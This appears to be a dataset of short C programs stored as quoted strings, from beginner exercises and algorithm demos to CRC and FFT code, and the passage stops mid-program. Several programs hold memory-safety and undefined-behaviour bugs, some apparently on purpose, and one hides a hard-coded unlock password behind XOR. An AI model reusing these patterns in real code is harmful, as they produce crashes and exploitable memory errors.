    "#include <stdio.h>\n#include <stddef.h>\n#include <stdint.h>\n\nvoid print_binary(uint32_t value) {\n    printf(\"%c%c%c%c%c%c%c%c\"\"_\"\"%c%c%c%c%c%c%c%c\"\"_\"\"%c%c%c%c%c%c%c%c\"\"_\"\"%c%c%c%c%c%c%c%c\",\n            ((value >> 24) & 0xff & 0x80 ? '1' : '0'), ((value >> 24) & 0xff & 0x40 ? '1' : '0'), ((value >> 24) & 0xff & 0x20 ? '1' : '0'), ((value >> 24) & 0xff & 0x10 ? '1' : '0'), ((value >> 24) & 0xff & 0x08 ? '1' : '0'), ((value >> 24) & 0xff & 0x04 ? '1' : '0'), ((value >> 24) & 0xff & 0x02 ? '1' : '0'), ((value >> 24) & 0xff & 0x01 ? '1' : '0'), ((value >> 16) & 0xff & 0x80 ? '1' : '0'), ((value >> 16) & 0xff & 0x40 ? '1' : '0'), ((value >> 16) & 0xff & 0x20 ? '1' : '0'), ((value >> 16) & 0xff & 0x10 ? '1' : '0'), ((value >> 16) & 0xff & 0x08 ? '1' : '0'), ((value >> 16) & 0xff & 0x04 ? '1' : '0'), ((value >> 16) & 0xff & 0x02 ? '1' : '0'), ((value >> 16) & 0xff & 0x01 ? '1' : '0'), ((value >> 8) & 0xff & 0x80 ? '1' : '0'), ((value >> 8) & 0xff & 0x40 ? '1' : '0'), ((value >> 8) & 0xff & 0x20 ? '1' : '0'), ((value >> 8) & 0xff & 0x10 ? '1' : '0'), ((value >> 8) & 0xff & 0x08 ? '1' : '0'), ((value >> 8) & 0xff & 0x04 ? '1' : '0'), ((value >> 8) & 0xff & 0x02 ? '1' : '0'), ((value >> 8) & 0xff & 0x01 ? '1' : '0'), ((value >> 0) & 0xff & 0x80 ? '1' : '0'), ((value >> 0) & 0xff & 0x40 ? '1' : '0'), ((value >> 0) & 0xff & 0x20 ? '1' : '0'), ((value >> 0) & 0xff & 0x10 ? '1' : '0'), ((value >> 0) & 0xff & 0x08 ? '1' : '0'), ((value >> 0) & 0xff & 0x04 ? '1' : '0'), ((value >> 0) & 0xff & 0x02 ? '1' : '0'), ((value >> 0) & 0xff & 0x01 ? '1' : '0'));\n}\nvoid print_hex(uint32_t value) {\n    printf(\"%02hhx%02hhx%02hhx%02hhx\",\n            (value >> 24) & 0xff, (value >> 16) & 0xff, (value >> 8) & 0xff, (value >> 0) & 0xff);\n}\nuint32_t crc32(const char *s,size_t n) {\n    uint32_t crc=0xFFFFFFFF;\n    for(size_t i=0;i<n;i++) {\n        char ch=s[i];\n        for(size_t j=0;j<8;j++) {\n            uint32_t b=(ch^crc)&1;\n            printf(\"\\n-------------------\\n%ld:%ld - \"\"%c%c%c%c%c%c%c%c\"\"\\n\", i, j, (ch & 0x80 ? '1' : '0'), (ch & 0x40 ? '1' : '0'), (ch & 0x20 ? '1' : '0'), (ch & 0x10 ? '1' : '0'), (ch & 0x08 ? '1' : '0'), (ch & 0x04 ? '1' : '0'), (ch & 0x02 ? '1' : '0'), (ch & 0x01 ? '1' : '0'));\n            print_hex(crc); printf(\"\\n\");\n            print_hex(~crc); printf(\"\\n\");\n            crc>>=1;\n            print_hex(crc); printf(\"\\n\");\n            print_hex(0xEDB88320); printf(\" & %d\\n\", b ? 1 : 0);\n            if(b) crc=crc^0xEDB88320;\n            ch>>=1;\n        }\n    }\n    return ~crc;\n}\nchar data[] = {\n    0x10, 0x65, 0x30, 0x70, 0x3d, 0x6d,\n    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,\n    0x08, 0x06,\n    0x00, 0x01, 0x08, 0x00, 0x06, 0x04,\n    0x00, 0x01,\n    0x70, 0x4d, 0x7b, 0x63, 0x18, 0x8f,\n    0x0a, 0x1f, 0x55, 0x6a,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x0a, 0x1f, 0x55, 0xff,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n};\nint main(int argc, char** argv) {\n    for (size_t itt = 0; itt < sizeof(data) / sizeof(char); itt++)\n        printf(\"%02hhx\", data[itt]);\n    uint32_t real_crc = crc32(data, sizeof(data) / sizeof(char));\n    printf(\"Real: \\t%02hhx%02hhx%02hhx%02hhx\\n\",\n            (real_crc >> 24) & 0xff, (real_crc >> 16) & 0xff, (real_crc >> 8) & 0xff, (real_crc >> 0) & 0xff);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int num1;\n    int num2;\n    int res;\n    num1=5;\n    num2=2;\n    res = num1 % num2;\n    printf(\" %d  %d = %d\", num1,num2,res);\n    return 0;\n}",
    "void f(int *p, int c) {\n c--;\n if (c < 0)\n  return;\n *p = c;\n f(p, c);\n}\nint main(void) {\n int a = 10;\n f(&a, 1);\n return 1 / a;\n}",
    "#include<stdio.h>\nint main(){\n int a, b, c, d;\n scanf(\"%i%i%i%i\", &a, &b, &c, &d);\n printf(\"DIFERENCA = %i\\n\", a * b - c * d);\n return 0;\n}",
    "#include <string.h>\n#include <unistd.h>\nint main(int argc, char** argv)\n{\n    argv[0] = \"wc\";\n    if (argc > 2)\n    {\n        if (!strcmp(argv[1], \"chars\"))\n            argv[1] = \"-c\";\n        else if (!strcmp(argv[1], \"words\"))\n            argv[1] = \"-w\";\n        else if (!strcmp(argv[1], \"lines\"))\n            argv[1] = \"-l\";\n    }\n    execvp(argv[0], argv);\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,m,q,l,r,i,j,k,a[1000][1000]={0};\n    char s[10000],t[10000];\n    scanf(\"%d %d %d\",&n,&m,&q);\n    scanf(\"%s\", s);\n    scanf(\"%s\", t);\n    for(i=0;i<n-1;i++)\n    {\n        for(j=i+1;j<n;j++)\n        {\n            k=0;\n            if(j-i+1>=m)\n            {\n                for(l=i;l<j-m+1;l++)\n                {\n                    r=0;\n                    while(s[l+r]==t[r] && r<m && l+r<n) r++;\n                    if(r==m) {k++;l+=m-1;}\n                }\n            }\n            a[i+1][j+1]=k;\n        }\n    }\n    while(q--)\n    {\n        scanf(\"%d %d\",&l,&r);\n        printf(\"%d\\n\",a[l][r]);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main( void )\n{\n  double C = 0.0;\n  double F = 27.0;\n  C = ( F - 32.0 ) / 1.8;\n  printf( \"27\u00b0F is equivalent to %g\u00b0C.\\n\", C );\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"The size of an int in bytes: %zd \\n\", sizeof(int));\n    printf(\"The size of a char in bytes: %zd \\n\", sizeof(char));\n    printf(\"The size of a long in bytes: %zd \\n\", sizeof(long));\n    printf(\"The size of a long long in bytes: %zd \\n\", sizeof(long long));\n    printf(\"The size of a double in bytes: %zd \\n\", sizeof(double));\n    printf(\"The size of a long double in bytes: %zd \\n\", sizeof(long double));\n    return 0;\n}",
    "#include <stdio.h>\ntypedef long int INT;\ntypedef double R;\ntypedef R E;\ntypedef INT *stride;\nvoid e01_8(const R *I, R *O, stride is, stride os, INT v, INT ivs, INT ovs)\n{\nconst E KP1_662939224 = ((E) +1.662939224605090474157576755235811513477121624);\nconst E KP1_111140466 = ((E) +1.111140466039204449485661627897065748749874382);\nconst E KP390180644 = ((E) +0.390180644032256535696569736954044481855383236);\nconst E KP1_961570560 = ((E) +1.961570560806460898252364472268478073947867462);\nconst E KP707106781 = ((E) +0.707106781186547524400844362104849039284835938);\nconst E KP1_414213562 = ((E) +1.414213562373095048801688724209698078569671875);\nconst E KP765366864 = ((E) +0.765366864730179543456919968060797733522689125);\nconst E KP1_847759065 = ((E) +1.847759065022573512256366378793576573644833252);\n  INT i;\n  for (i = v; i > 0; i = i - 1, I = I + ivs, O = O + ovs) {\n    E T7, Tl, T4, Tk, Td, To, Tg, Tn;\n    {\n      E T5, T6, T1, T3, T2;\n      T5 = I[(is[2])];\n      T6 = I[(is[6])];\n      T7 = (((KP1_847759065) * (T5)) + (KP765366864 * T6));\n      Tl = ((KP765366864 * T5) - ((KP1_847759065) * (T6)));\n      T1 = I[0];\n      T2 = I[(is[4])];\n      T3 = KP1_414213562 * T2;\n      T4 = T1 + T3;\n      Tk = T1 - T3;\n      {\n    E T9, Tf, Tc, Te, Ta, Tb;\n    T9 = I[(is[1])];\n    Tf = I[(is[7])];\n    Ta = I[(is[5])];\n    Tb = I[(is[3])];\n    Tc = KP707106781 * (Ta + Tb);\n    Te = KP707106781 * (Ta - Tb);\n    Td = T9 + Tc;\n    To = Te + Tf;\n    Tg = Te - Tf;\n    Tn = T9 - Tc;\n      }\n        }\n        {\n      E T8, Th, Tq, Tr;\n      T8 = T4 + T7;\n      Th = ((KP1_961570560 * Td) - ((KP390180644) * (Tg)));\n      O[(os[7])] = T8 - Th;\n      O[0] = T8 + Th;\n      Tq = Tk - Tl;\n      Tr = (((KP1_111140466) * (Tn)) + (KP1_662939224 * To));\n      O[(os[5])] = Tq - Tr;\n      O[(os[2])] = Tq + Tr;\n        }\n        {\n      E Ti, Tj, Tm, Tp;\n      Ti = T4 - T7;\n      Tj = (((KP390180644) * (Td)) + (KP1_961570560 * Tg));\n      O[(os[4])] = Ti - Tj;\n      O[(os[3])] = Ti + Tj;\n      Tm = Tk + Tl;\n      Tp = ((KP1_662939224 * Tn) - ((KP1_111140466) * (To)));\n      O[(os[6])] = Tm - Tp;\n      O[(os[1])] = Tm + Tp;\n        }\n   }\n}\n\nint main()\n{\n static INT s[8] = { 0,1,2,3,4,5,6,7 };\n static R i[1024];\n static R o[1024];\n int k;\n for (k = 0; k < 1024; ++k) i[k] = k;\n for (k = 0; k < (100 * 1000); ++k)\n  e01_8(i, o, s, s, 64, 8, 8);\n        for (k = 0; k < 16; ++k)\n          printf(\"o[%d] = %.6e\\n\", k, o[k]);\n return 0;\n}",
    "int main() {\n  int example[10];\n  int i;\n  for (i = 0; i < 10; ++i) {\n    example[i] = i;\n  }\n  return example[6];\n}",
    "#include <stdio.h>\nint main ()\n{\n int dob,birth_month,birth_year;\n printf(\"Enter your date of birth in dd:mm:yyyy format:- \");\n scanf(\"%2d:%2d:%4d\", &dob, &birth_month, &birth_year) ;\n printf(\"Day %d, month %d and year %d\" ,dob, birth_month, birth_year) ;\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    int x,y,i,cant=4,tam=1,espacios=0,p;\n    char *arreglo[cant];\n    char *dato;\n    char *m;\n    char *z;\nprintf(\"\\n\\n\\t\\t\\t\\tBienvenido \\n\");\nprintf(\"\\n Pulse enter para iniciar \");\n    for(i=0; i<cant; i++){\n        getchar();\n        printf(\"\\nIngrese la letra de su proceso: \\nlocalidad de memoria en donde se guradara[%i]: \",i);\n        dato = (char*) malloc(tam);\n        scanf(\"%[^\\n]\",dato);\n        if (*dato == ' ') *dato = '-';\n        arreglo[i] = dato;\n    }\n    free (arreglo[cant]);\n    printf(\"\\nLos procesos ingresados son: \\n\");\n    for(i=0; i<cant; i++){\n        printf(\"%s\",arreglo[i]);\n           }\n    getchar();\n    getchar();\n    do{\n        system(\"clear\");\n    printf(\"Si desea salir del programa [3]\\n\");\n    printf(\"\\nDesea asignar proceso [1] o Liberar proceso [2]: \");\n    scanf(\"%d\", &x);\n    switch(x)\n   {\n        case 1:\n        for(i=0; i<cant; i++){\n        if (*arreglo[i] == '-')\n            espacios++;\n    }\nif (espacios!=1){\n        printf(\"\\nIngresar letra de nuevo proceso: \");\n        m = (char*) malloc(tam);\n         scanf(\"%s\",m);\n        printf(\"\\nIngresar tama\u00f1o del proceso: \");\n                scanf(\"%d\",&p);\n                    if(p>15) printf(\"\\t\\tMaximo de memoria para un proceso: 15\");\n                else{\n             for(i=0; i<cant; i++){\n                if(*arreglo[i] == '-') *arreglo[i] = *m;\n                  }\n            printf(\"\\nEl proceso: [ %s ] se asigno en las localidades de memoria vacia.\\n\", m);\n            printf(\"\\n\");\n         for(i=0; i<cant; i++){\n          printf(\"%s\",arreglo[i]);\n    }\n  }\n}\n        else\n            printf(\" Liberar memoria por favor. Minimo de memoria para un proceso: 2 \");\n    free (arreglo[cant]);\n    espacios=0;\n    getchar();\n       break;\n       case 2:\n        printf(\"\\nProceso a liberar: \");\n        z = (char*) malloc(tam);\n        scanf(\"%s\",z);\n        for(i=0; i<cant; i++){\n        if (*arreglo[i] != *z) printf(\"\");\n        else\n             {\n            if (*arreglo[i] == *z) *arreglo[i] = '-';\n     printf(\"\\nproceso: [ %s ] liberado\\n\", z);\n         printf(\"\\n\");\n         for(i=0; i<cant; i++){\n          printf(\"%s\",arreglo[i]);\n}\n}\n}\n    free (arreglo[cant]);\n    getchar();\n    break;\n    case 3:\n            exit(0);\n            break;\n       default: system(\"clear\");\n                printf(\"ahorita no joven\\n\");\n                getchar();\n    }\n    getchar();\n}\n    while(x !=0);\n    printf(\"\\n\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <ctype.h>\ndouble get_shaded_region(double r);\nint main() {\n    double r;\n    int t, i;\n    scanf(\"%d\", &t);\n    for (i = 1; i <= t; i++)\n    {\n        scanf(\" %lf\", &r);\n        printf(\"Case %d: %.2lf\\n\", i, get_shaded_region(r));\n    }\n    return 0;\n}\ndouble get_shaded_region(double r)\n{\n    double area_of_circle = 3.14159265358979323846 * (r*r);\n    double a = r*2;\n    double area_of_squate = a*a;\n    return (area_of_squate - area_of_circle);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a;\n    printf(\"Enter a year: \");\n    scanf(\"%d\",&a);\n    if (a%4==0)\n        printf(\"\\nThe year %d is a Leap Year.\\n\",a);\n    else\n        printf(\"\\nThe year %d is NOT a Leap Year.\\n\",a);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid initializeMagicSquare(unsigned int magicSquare[][19], unsigned int magicSquareOrder);\nvoid displayMagicSquare(unsigned int magicSquare[][19], unsigned int magicSquareOrder);\nvoid adjustPosition(unsigned int *xPosition, unsigned int *yPosition, unsigned int magicSquareOrder);\nint main(void)\n{\n    unsigned int magicSquare[19][19];\n    unsigned int magicSquareOrder, currentNumber, xPosition, previousXPosition, yPosition, previousYPosition;\n    int correctMagicSquareOrder;\n    int keepCreating;\n    do\n    {\n        do\n        {\n            correctMagicSquareOrder = 0;\n            printf(\"Create a magic square of n * n size (n order).\\nPlease type the order as a positive odd integer lower than %d: \", 19 + 1);\n            scanf(\"%d\", &magicSquareOrder);\n            if(magicSquareOrder < 0 || magicSquareOrder % 2 == 0 || magicSquareOrder > 19)\n                printf(\"\\tThe order you typed is invalid. Please read the instructions once more.\\n\\n\");\n            else\n                correctMagicSquareOrder = 1;\n        } while (!correctMagicSquareOrder);\n        initializeMagicSquare(magicSquare, magicSquareOrder);\n        currentNumber = 1;\n        xPosition = magicSquareOrder / 2;\n        yPosition = magicSquareOrder / 2 + 1;\n        if (magicSquareOrder == 1)\n            magicSquare[0][0] = 1;\n        else\n            magicSquare[xPosition][yPosition] = currentNumber;\n        for (currentNumber = 2 ; currentNumber <= magicSquareOrder * magicSquareOrder ; currentNumber++)\n        {\n            previousXPosition = xPosition;\n            previousYPosition = yPosition;\n            xPosition++;\n            yPosition++;\n            adjustPosition(&xPosition, &yPosition, magicSquareOrder);\n            if(magicSquare[xPosition][yPosition] != 0)\n            {\n                xPosition = previousXPosition;\n                yPosition = previousYPosition + 2;\n                adjustPosition(&xPosition, &yPosition, magicSquareOrder);\n            }\n            magicSquare[xPosition][yPosition] = currentNumber;\n        }\n        displayMagicSquare(magicSquare, magicSquareOrder);\n        printf(\"Do you want to create a new one?\\nType 1 if you want to, anything else if you don't want to: \");\n        scanf(\"%d\", &keepCreating);\n    } while (keepCreating == 1);\n    return 0;\n}\nvoid initializeMagicSquare(unsigned int magicSquare[][19], unsigned int magicSquareOrder)\n{\n    int i = 0, j = 0;\n    for(i = 0 ; i < magicSquareOrder ; i++)\n        for(j = 0 ; j < magicSquareOrder ; j++)\n            magicSquare[i][j] = 0;\n}\nvoid displayMagicSquare(unsigned int magicSquare[][19], unsigned int magicSquareOrder)\n{\n    int i = 0, j = 0;\n    for(j = 0 ; j < magicSquareOrder ; j++)\n    {\n        for(i = 0 ; i < magicSquareOrder ; i++)\n            printf(\"+---\");\n        printf(\"+\\n\");\n        for(i = 0 ; i < magicSquareOrder ; i++)\n            printf(\"|%03d\", magicSquare[i][j]);\n        printf(\"|\\n\");\n    }\n    for(i = 0 ; i < magicSquareOrder ; i++)\n  printf(\"+---\");\n    printf(\"+\\n\");\n}\nvoid adjustPosition(unsigned int *xPosition, unsigned int *yPosition, unsigned int magicSquareOrder)\n{\n    if(*xPosition >= magicSquareOrder)\n        *xPosition -= magicSquareOrder;\n    if(*yPosition >= magicSquareOrder)\n        *yPosition -= magicSquareOrder;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint adjMatrix[100][100], numberOfNodes;\nvoid Prim()\n{\n    int cost=0,visited[100],minimum=600,minPoz=0,i,startNode,j,nodesLeft;\n    printf(\"Enter the number of nodes\\n\");\n    scanf(\"\\n%d\", &numberOfNodes);\n    nodesLeft=numberOfNodes;\n    for (i=0;i<=numberOfNodes;i++)\n        visited[i]=-1;\n    printf(\"Enter the node you want to start from\\n\");\n    scanf(\"%d\",&startNode);\n    visited[startNode]=0;\n    printf(\"The order is : %d \",startNode);\n    while (nodesLeft>0)\n    {\n        for (i=1;i<=numberOfNodes;i++)\n            if (visited[i]!=-1)\n                for (j=1;j<=numberOfNodes;j++)\n                    if (adjMatrix[i][j]!=0 && adjMatrix[i][j]<minimum && visited[j]==-1)\n                    {\n                        minimum=adjMatrix[i][j];\n                        minPoz=j;\n                    }\n        visited[minPoz]=minimum;\n        printf(\"%d \",minPoz);\n        nodesLeft--;\n    }\n    cost=0;\n    for (i=1;i<=numberOfNodes;i++)\n        cost+=visited[i];\n    printf(\"The total cost is : %d\\n\",cost);\n}\nint main()\n{\n    printf(\"Here we go\\n\");\n    Prim();\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint linearsearch(int *arr, int size, int val)\n{\n    int i;\n    for (i = 0; i < size; i++)\n    {\n        if (arr[i] == val)\n            return 1;\n    }\n    return 0;\n}\nint main()\n{\n    int n, i, v;\n    printf(\"Enter the size of the array:\\n\");\n    scanf(\"%d\", &n);\n    int *a = (int *)malloc(n * sizeof(int));\n    printf(\"Enter the contents for an array of size %d:\\n\", n);\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", &a[i]);\n    printf(\"Enter the value to be searched:\\n\");\n    scanf(\"%d\", &v);\n    if (linearsearch(a, n, v))\n        printf(\"Value %d is in the array.\\n\", v);\n    else\n        printf(\"Value %d is not in the array.\\n\", v);\n    free(a);\n    return 0;\n}",
    "int getchar(void);\nint putchar(int c);\nint main() {\n  int c = getchar();\n  if (c <= 'A')\n    putchar('X');\n  else\n    putchar('Y');\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid extremelyLargeString(int size, char *ptr)\n{\n    int index = 0;\n    char aux;\n    while ((aux = getchar()) && aux != '\\n')\n    {\n        if (index < size)\n        {\n            ptr[index] = aux;\n        }\n        else\n        {\n            ptr = realloc(ptr, (size + 3) * sizeof(char));\n            size += 3;\n            ptr[index] = aux;\n        }\n        index++;\n    }\n    if(ptr[index - 1] != '$')\n    {\n        printf(\"Error: Escape character not introduced \\n\");\n    }\n    else\n    {\n        printf(\"String: %s\\n\", ptr);\n    }\n}\nint main(void)\n{\n    int size = 3;\n    char *ptr = ((void*)0);\n    ptr = malloc(sizeof(char) * size);\n    printf(\"Escape character: $\\n\");\n    printf(\"Introduce a extremely large string: \");\n    extremelyLargeString(size, ptr);\n    free(ptr);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int mark_01, mark_02;\n  printf(\"%s\", \"Enter Marks of Subject 01 : \");\n  scanf(\"%d\", &mark_01);\n  printf(\"%s\", \"Enter Marks of Subject 02 : \");\n  scanf(\"%d\", &mark_02);\n  printf(\"/n%s %d\", \"Average of Marks : \", (mark_01 + mark_02)/2);\n  return 0;\n}",
    "#include <stdio.h>\n#include<stdlib.h>\nvoid copie (FILE * fs, FILE * fd)\n{\n    int c ;\n    while( (c= fgetc(fs)) != (-1))\n        fputc(c,fd);\n}\nint main()\n{\n    FILE * source = fopen(\"exo.rtf\",\"r\");\n    FILE * destination = fopen(\"copie.rtf\",\"w\");\n    copie (source, destination);\n    fclose(source);\n    fclose(destination);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint dx[8] = {-1, 0, 1, -1, 1, -1, 0, 1};\nint dy[8] = {-1, -1, -1, 0, 0, 1, 1, 1};\nint token_exists(char** matrix, int sizeX, int sizeY, int fromX, int fromY, char* token, int sizeT, int idx){\n if(fromX < 0 || fromX > sizeX - 1 || fromY < 0 || fromY > sizeY - 1){\n  return 0;\n }\n if(matrix[fromX][fromY] != token[idx]){\n  return 0;\n }\n if(idx == sizeT - 1){\n  return 1;\n }\n idx++;\n int i=0;\n for(i=0;i<8;i++){\n  if(token_exists(matrix, sizeX, sizeY, fromX+dx[i], fromY+dy[i], token, sizeT, idx)){\n   return 1;\n  }\n }\n return 0;\n}\nint main(int argc, char const *argv[])\n{\n char** matrix = (char**)malloc(sizeof(char*)*5);\n matrix[0] = \"URLPM\";\n matrix[1] = \"XPRET\";\n matrix[2] = \"GIAET\";\n matrix[3] = \"XTNZY\";\n matrix[4] = \"XOQRS\";\n printf(\"%d\\n\", token_exists(matrix, 5, 5, 2, 2, \"GIRL\", 4, 0));\n return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main()\n{\n  float fahr;\n  printf(\"%10s\\t%10s\\n\", \"Fahrenheit\", \"Celsius\");\n  for (fahr = 300; fahr >= 0; fahr = fahr - 20)\n    printf(\"%10.0f\\t%10.1f\\n\", fahr, (5.0/9.0)*(fahr-32));\n}",
    "#include <stdio.h>\nint main()\n{\n    int matriz[3][3];\n    int col, lin, maior = 0, menor = 9999999;\n    for (lin = 0; lin < 3; lin++)\n    {\n        for (col = 0; col < 3; col++)\n        {\n            printf(\"\\nDigite linha e coluna (%d,%d):\", lin, col);\n            scanf(\"%d\", &matriz[lin][col]);\n        }\n    }\n    for (lin = 0; lin < 3; lin++)\n    {\n        for (col = 0; col < 3; col++)\n        {\n            if (matriz[lin][col] == 0)\n            {\n                maior = matriz[lin][col];\n                menor = matriz[lin][col];\n            }\n            else if (matriz[lin][col] > maior)\n            {\n                maior = matriz[lin][col];\n            }\n            else if (matriz[lin][col] < menor)\n            {\n                menor = matriz[lin][col];\n            }\n        }\n    }\n    printf(\"\\nMaior: %d\", maior);\n    printf(\"\\nMenor: %d\", menor);\n    return 0;\n}",
    "#include <stdio.h>\nint main( void )\n{\n    unsigned char k=255;\n    for(int i=31;i>=0;i--){\n      printf( \"%d \" ,k>>i&1);\n       if(i%8== 0)\n       printf(\" \");\n   }\nprintf(\"\\n\");\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int dig;\n    printf(\"Enter a digit : \\n\");\n    scanf(\"%d\", &dig);\n    switch (dig)\n    {\n    case 0:\n        printf(\"Zero\\n\");\n        break;\n    case 1:\n        printf(\"One\\n\");\n        break;\n    case 2:\n        printf(\"Two\\n\");\n        break;\n    case 3:\n        printf(\"Three\\n\");\n        break;\n    case 4:\n        printf(\"Four\\n\");\n        break;\n    case 5:\n        printf(\"Five\\n\");\n        break;\n    case 6:\n        printf(\"Six\\n\");\n        break;\n    case 7:\n        printf(\"Seven\\n\");\n        break;\n    case 8:\n        printf(\"Eight\\n\");\n        break;\n    case 9:\n        printf(\"Nine\\n\");\n        break;\n    default:\n        printf(\"Invalid input\\n\");\n        break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\n\nint main(void) {\n char msg[] = {('T')^0xbc, ('h')^0xbc, ('e')^0xbc, ('S')^0xbc, ('e')^0xbc, ('c')^0xbc, ('r')^0xbc, ('e')^0xbc, ('t')^0xbc, ('P')^0xbc, ('a')^0xbc, ('s')^0xbc, ('s')^0xbc, ('w')^0xbc, ('o')^0xbc, ('r')^0xbc, ('d')^0xbc, ('\\0')^0xbc };\n for(int i = 0; i < sizeof(msg); i++) {\n  msg[i] = (msg[i])^=0xbc;\n }\n printf(\"\\n\\nThe unlock code is: %s\\n\\n\\n\", msg);\n}",
    "#include <stdio.h>\n#include <regex.h>\n#include <string.h>\n\nint main(int argc, char *argv[])\n{\n regex_t re;\n regmatch_t matches[3];\n int ret, len, max_len, offset;\n char buf[128];\n char *txt_ptr, *char_ptr;\n char *const text = \"option1 = value1\\noption2 = value2\\nattribute = 1:2\\nattribute = 2:2\";\n const char *const regexp = \"(\\\\w+) *= *(\\\\S+)\";\n if((ret = regcomp(&re, regexp, 1)) != 0) {\n  regerror(ret, &re, buf, 128);\n  buf[128 - 1] = 0;\n  printf(\"%s\\n\", buf);\n  ret = -1;\n  goto do_exit;\n }\n max_len = strlen(text);\n offset = 0;\n while(offset < max_len) {\n  txt_ptr = text + offset;\n  if(regexec(&re, txt_ptr, 3, matches, 0) == 0) {\n   printf(\"Match OK\\n\");\n   printf(\"%d %d\\n\", matches[0].rm_so, matches[0].rm_eo);\n   printf(\"%d %d\\n\", matches[1].rm_so, matches[1].rm_eo);\n   printf(\"%d %d\\n\", matches[2].rm_so, matches[2].rm_eo);\n   char_ptr = txt_ptr + matches[1].rm_so;\n   if((len = matches[1].rm_eo - matches[1].rm_so) > 128)\n    len = 128 -1;\n   memcpy(buf, char_ptr, len);\n   buf[len] = 0;\n   printf(\"option:%s \", buf);\n   char_ptr = txt_ptr + matches[2].rm_so;\n   if((len = matches[2].rm_eo - matches[2].rm_so) > 128)\n    len = 128 -1;\n   memcpy(buf, char_ptr, len);\n   buf[len] = 0;\n   printf(\"value:%s\\n\", buf);\n   offset += (matches[2].rm_eo + 1);\n  }\n  else {\n   printf(\"Match NOK\\n\");\n   break;\n  }\n }\ndo_exit:\n regfree(&re);\n return ret;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <string.h>\nint main() {\n  pid_t my_pid, my_ppid, value;\n  int test_var=5;\n  int *p_var=&test_var;\n  switch (value = fork()) {\n  case -1:\n    fprintf((stderr),\"Error #%03d: %s\\n\", errno, strerror(errno));\n    break;\n  case 0:\n    sleep(2);\n    my_pid = getpid();\n    my_ppid = getppid();\n    printf(\"CHILD:  PID=%d, PPID=%d, fork_value=%d\\n\", my_pid, my_ppid, value);\n    test_var++;\n    printf(\"Child: test_var = %d\\n\\n\",test_var);\n    printf(\"Child: p_var = %p\\n\\n\",p_var);\n    *p_var=10;\n    printf(\"Child: test_var = %d\\n\\n\",test_var);\n    printf(\"Child: p_var = %p\\n\\n\",p_var);\n    break;\n  default:\n    my_pid = getpid();\n    my_ppid = getppid();\n    printf(\"PARENT: PID=%d, PPID=%d, fork_value=%d\\n\", my_pid, my_ppid, value);\n    sleep(5);\n    test_var++;\n    printf(\"Parent:test_var = %d\\n\\n\",test_var);\n    printf(\"Parent: p_var = %p\\n\\n\",p_var);\n    break;\n  }\n  exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint isWithin16(char *s);\nint main(int argc, char *argv[])\n{\n    if(isWithin16(argv[1]) == 0) {\n        printf(\"\u5165\u529b\u3055\u308c\u305f\u6587\u5b57\u5217\u306f16\u6587\u5b57\u4ee5\u4e0a\u3067\u3059\u3002\u30d7\u30ed\u30b0\u30e9\u30e0\u3092\u7d42\u4e86\u3057\u307e\u3059\u3002\\n\");\n        exit(1);\n    }\n    char *pi = (char *)malloc(sizeof(char) * (int)strlen(argv[1]+1));\n    if (pi == ((void*)0)) {\n        printf(\"\u30e1\u30e2\u30ea\u3092\u78ba\u4fdd\u3067\u304d\u307e\u305b\u3093\u3002\\n\");\n        exit(1);\n    }\n    pi = argv[1];\n    while (1) {\n        if (*pi == '\\0') {\n            break;\n        }\n        printf(\"%c\\n\", *pi);\n        pi++;\n    }\n    while (pi != ((void*)0)) {\n        free(pi);\n    }\n    return 0;\n}\nint isWithin16(char *s)\n{\n    int counter;\n    while (*s++ != '\\0') {\n        counter++;\n    }\n    if (counter > 16) {\n        return -1;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  printf(\"This is a really awful program!\\n\");\n  int* p = (int*)0x55;\n  *p = 0;\n  return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<malloc.h>\n#include<math.h>\nchar a[11][11];\nchar b[11][11];\nint c[11][11]={0};\nint n;\nvoid df(int x,int y){\n    int next[8][2]={{1,0},{0,1},{-1,0},{0,-1},{1,1},{-1,-1},{1,-1},{-1,1}};\n    int k;\n    int tx,ty;\n    for(k=0;k<8;k++){\n        tx=x+next[k][0];\n        ty=y+next[k][1];\n        if(tx<0||tx>=n||ty<0||ty>=n||a[tx][ty]!='.')\n            continue;\n        c[tx][ty]+=1;\n    }\n}\nint main(){\n    int i,j,k;\n    scanf(\"%d\",&n);\n    for(i=0;i<n;i++){\n            scanf(\"%s\",a[i]);\n    }\n    for(i=0;i<n;i++){\n            scanf(\"%s\",b[i]);\n    }\n    for(i=0;i<n;i++){\n        for(j=0;j<n;j++){\n                if(a[i][j]=='*'){\n                    df(i,j);\n            }\n        }\n    }\n    int flag=0;\n     for(i=0;i<n;i++){\n        for(j=0;j<n;j++){\n                if(b[i][j]=='x'&&a[i][j]=='*'){\n                    flag=1;\n                    break;\n                }\n        }\n     }\n    for(i=0;i<n;i++){\n        for(j=0;j<n;j++){\n                if(b[i][j]=='x'){\n                        if(a[i][j]=='*'){\n                            